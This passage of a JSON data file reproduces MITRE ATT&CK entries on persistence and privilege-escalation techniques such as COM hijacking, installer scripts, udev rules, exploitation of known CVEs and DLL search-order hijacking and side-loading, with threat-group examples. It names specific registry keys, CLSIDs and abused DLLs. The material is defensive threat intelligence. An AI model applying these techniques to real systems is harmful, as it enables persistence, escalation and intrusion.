command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.", "id": "T1546.014", "examples": []}, {"name": "Component Object Model Hijacking", "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry.\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.", "id": "T1546.015", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can use COM hijacking to establish persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A})."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has modified ComSysApp service to load the malicious DLL payload."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito uses COM hijacking as a method of persistence."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has created the HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32 Registry key for persistence."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can add a CLSID key for payload execution through Registry.CurrentUser.CreateSubKey(\"Software\\\\Classes\\\\CLSID\\\\{\" + clsid + \"}\\\\InProcServer32\")."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has created the HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{E6D34FFC-AD32-4d6a-934C-D387FA873A19} Registry key for persistence."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT  can perform COM hijacking by setting the path to itself to the HKCU\\Software\\Classes\\Folder\\shell\\open\\command key with a DelegateExecute parameter."}]}, {"name": "Installer Packages", "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.", "detailed_description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS postinstall scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions.\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include preinst, postinst, prerm, postrm scripts and run as root when executed.\nFor Windows, the Microsoft Installer services uses .msi files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.", "id": "T1546.016", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "During AppleJeus's installation process, it uses postinstall scripts to extract a hidden plist from the application's /Resources folder and execute the plist file as a Launch Daemon with elevated permissions."}]}, {"name": "Udev Rules", "description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the /dev directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with match keys to specify the conditions a hardware event must meet and action keys to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in /etc/udev/rules.d/, /run/udev/rules.d/, /usr/lib/udev/rules.d/, /usr/local/lib/udev/rules.d/, and /lib/udev/rules.d/. Rule priority is determined by both directory and by the digit prefix in the rule filename.", "detailed_description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the /dev directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with match keys to specify the conditions a hardware event must meet and action keys to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in /etc/udev/rules.d/, /run/udev/rules.d/, /usr/lib/udev/rules.d/, /usr/local/lib/udev/rules.d/, and /lib/udev/rules.d/. Rule priority is determined by both directory and by the digit prefix in the rule filename.\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as /dev/random, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key RUN+= to detach and run the malicious content\u2019s process in the background to bypass these controls.", "id": "T1546.017", "examples": []}]}, {"name": "Exploitation for Privilege Escalation", "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.", "detailed_description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.", "id": "T1068", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges."}, {"id": "G0016", "name": "APT29", "description": "APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used CVE-2016-7255 to escalate privileges."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has exploited CVE-2021-1732 for privilege escalation."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used exploits to increase their levels of rights and privileges."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can exploit vulnerabilities such as MS14-058."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398."}, {"id": "S0363", "name": "Empire", "description": "Empire can exploit vulnerabilities such as MS16-032 and MS16-135."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has exploited the CVE-2016-0167 local vulnerability."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used the BOtB tool which exploits CVE-2019-5736."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has exploited CVE-2021-1732 to execute malware components with elevated rights."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has leveraged a zero-day vulnerability to escalate privileges."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can use CVE-2019-0859 to escalate privileges on a compromised host."}, {"id": "S0125", "name": "Remsec", "description": "Remsec has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys)."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape has leveraged a vulnerability in Windows containers to perform an Escape to Host."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges."}, {"id": "G0010", "name": "Turla", "description": "Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird exploits CVE-2016-4117 to allow an executable to gain escalated privileges."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare has used a vulnerable signed VBoxDrv driver to bypass Microsoft Driver Signature Enforcement (DSE) protections and subsequently load the unsigned RawDisk driver."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation."}, {"id": "S0672", "name": "Zox", "description": "Zox has the ability to leverage local and remote exploits to escalate privileges."}], "sub_techniques": []}, {"name": "Hijack Execution Flow", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.", "id": "T1574", "examples": [{"id": "C0017", "name": "C0017", "description": "During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will remove and write malicious shared objects associated with legitimate system functions such as read(2)."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate edits the Registry key HKCU\\Software\\Classes\\mscfile\\shell\\open\\command to execute a malicious AutoIt script. When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key."}, {"id": "S0354", "name": "Denis", "description": "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe."}, {"id": "S0567", "name": "Dtrack", "description": "One of Dtrack can replace the normal flow of a program execution with malicious code."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses a legitimate executable to load a malicious DLL file for installation."}, {"id": "C0036", "name": "Pikabot Distribution February 2024", "description": "Pikabot Distribution February 2024 utilized a tampered legitimate executable, grepWinNP3.exe, for its first stage Pikabot loader, modifying the open-source tool to execute malicious code when launched."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will drop a copy of itself to a subfolder in %Program Data% or %Program Data%\\Microsoft\\ to attempt privilege elevation and defense evasion if not running in Session 0."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot will use the malicious file slideshow.mp4 if present to load the core API provided by ntdll.dll to avoid any hooks placed on calls to the original ntdll.dll file by endpoint detection and response or antimalware software."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls."}], "sub_techniques": [{"name": "DLL Search Order Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.", "id": "T1574.001", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has used DLL search-order hijacking to load exe, dll, and dat files into memory. Aquatic Panda loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can launch itself via DLL Search Order Hijacking."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has executed DLL search order hijacking."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used search order hijacking to load a malicious DLL."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit various DLL hijacking opportunities."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder."}, {"id": "S0182", "name": "FinFisher", "description": "A FinFisher variant uses DLL search order hijacking."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate version.dll during the Microsoft.IdentityServer.ServiceHost.exe execution process."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has used DLL Search Order Hijacking to load oci.dll as a persistence mechanism."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll."}, {"id": "S1097", "name": "HUI Loader", "description": "HUI Loader can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can use DLL hijacking to bypass security controls."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used DLL search order hijacking."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has the ability to use DLL search order hijacking for installation on targeted systems."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves is launched through use of DLL search order hijacking to load a malicious dll."}, {"id": "G0048", "name": "RTM", "description": "RTM has used search order hijacking to force TeamViewer to load a malicious DLL."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has performed DLL search order hijacking to execute their payload."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has performed DLL hijacking before execution."}, {"id": "S0109", "name": "WEBC2", "description": "Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll)."}, {"id": "G0107", "name": "Whitefly", "description": "Whitefly has used search order hijacking to run the loader Vcrodat."}]}, {"name": "DLL Side-Loading", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).", "detailed_description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "id": "T1574.002", "examples": [{"id": "G0073", "name": "APT19", "description": "APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL."}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools."}, {"id": "G0050", "name": "APT32", "description": "APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used legitimate executables to perform DLL side-loading of their malware."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable."}, {"id": "S0127", "name": "BBSRAT", "description": "DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable, ssonsvr.exe. The Citrix executable was dropped along with BBSRAT by the dropper."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used legitimate applications to side-load malicious DLLs."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL  and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used side loading to place malicious DLLs in memory."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy can use a digitally signed binary (\"Logitech Bluetooth Wizard Host Process\") to load its dll into memory."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has abused legitimate executables to side-load weaponized DLLs."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can store a file named mpsvc.dll, which opens a malicious mpsvc.mui file, in the same folder as the legitimate Microsoft executable MsMpEng.exe to gain execution."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used legitimate software to side-load PlugX loaders onto victim systems. Daggerfly is also linked to multiple other instances of side-loading for initial loading activity."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate includes one infection vector that leverages a malicious \"KeyScramblerE.DLL\" library that will load during the execution of the legitimate KeyScrambler application."}, {"id": "S0354", "name": "Denis", "description": "Denis exploits a security vulnerability to load a fake DLL and execute its code."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can abuse legitimate Windows executables to side-load malicious DLL files."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has placed a malicious payload in %WINDIR%\\SYSTEM32\\oci.dll so it would be sideloaded by the MSDTC service."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used DLL side-loading to execute its payload."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507)."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher uses DLL side-loading to load malicious programs."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine."}, {"id": "S0032", "name": "gh0st RAT", "description": "A gh0st RAT variant has used DLL side-loading."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa\u2019s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has used DLL side-loading."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload."}, {"id": "S0528", "name": "Javali", "description": "Javali can use DLL side-loading to load malicious DLLs into legitimate executables."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can use DLL side-loading to load malicious DLLs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe has been executed as a file named DsNcDiag.dll through side-loading."}, {"id": "S0582", "name": "LookBack", "description": "LookBack side loads its communications module as a DLL into the libcurl.dll loader."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used legitimate executables such as winword.exe and igfxem.exe to side-load their malware."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can support an HKCMD sideloading start method."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has side-loaded its malicious DLL file."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used DLL side-loading to load malicious DLL's into legitimate executables."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can use DLL side-loading to gain execution."}, {"id": "S1100", "name": "Ninja", "description": "Ninja loaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the legitimate Windows services IKEEXT and PrintNotify to side-load malicious DLLs."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can use DLL side-loading to execute malicious payloads."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading."}, {"id": "S1102", "name": "Pcexter", "description": "Pcexter has been distributed and executed as a DLL file named Vspmsg.dll via DLL side-loading."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has used DLL side-loading to evade anti-virus."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can side-load Goopdate.dll into GoogleUpdate.exe."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to use DLL side-loading for execution."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use side-loading to run malicious executables."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can use legitimate, signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can be installed via DLL side-loading."}, {"id": "S0074", "name": "Sakula", "description": "Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has used a malicious loader DLL file to execute the credwiz.exe process and side-load the malicious payload Duser.dll."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can load DLLs through vulnerable legitimate executables."}, {"id": "S0098", "name": "T9000", "description": "During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear has used DLL side loading to import and load a malicious DLL loader."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed 